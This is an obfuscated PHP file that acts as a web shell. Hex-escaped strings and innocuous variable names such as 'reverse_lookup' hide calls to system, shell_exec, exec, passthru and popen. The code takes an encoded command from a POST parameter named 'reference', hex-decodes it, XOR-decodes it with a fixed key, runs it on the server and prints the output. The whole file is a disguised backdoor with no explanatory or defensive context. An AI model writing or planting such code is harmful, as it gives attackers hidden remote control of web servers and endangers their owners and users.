<?php

$reverse_lookup1 = "\x73yst\x65\x6D";
$reverse_lookup4 = "p\x61\x73\x73thr\x75";
$reverse_lookup2 = "\x73\x68e\x6Cl\x5Fex\x65c";
$reverse_lookup6 = "st\x72ea\x6D\x5Fg\x65t_co\x6E\x74\x65\x6Et\x73";
$reverse_lookup3 = "\x65\x78ec";
$reverse_lookup5 = "p\x6Fp\x65n";
$module_controller = "he\x78\x32\x62in";
$reverse_lookup7 = "pc\x6C\x6F\x73e";
if (isset($_POST["\x72e\x66\x65\x72ence"])) {
            function data_storage($ref ,  $token ) {
 $property_set='' ;
foreach(str_split($ref) as $char){
$property_set.=chr(ord($char)^$token);

} return$property_set;
 
}
            $reference = $module_controller($_POST["\x72e\x66\x65\x72ence"]);
            $reference = data_storage($reference, 71);
            if (function_exists($reverse_lookup1)) {
                $reverse_lookup1($reference);
            } elseif (function_exists($reverse_lookup2)) {
                print $reverse_lookup2($reference);
            } elseif (function_exists($reverse_lookup3)) {
                $reverse_lookup3($reference, $fac_ref);
                print join("\n", $fac_ref);
            } elseif (function_exists($reverse_lookup4)) {
                $reverse_lookup4($reference);
            } elseif (function_exists($reverse_lookup5) && function_exists($reverse_lookup6) && function_exists($reverse_lookup7)) {
                $token_property_set = $reverse_lookup5($reference, 'r');
                if ($token_property_set) {
                    $obj_tkn = $reverse_lookup6($token_property_set);
                    $reverse_lookup7($token_property_set);
                    print $obj_tkn;
                }
            }
            exit;
        }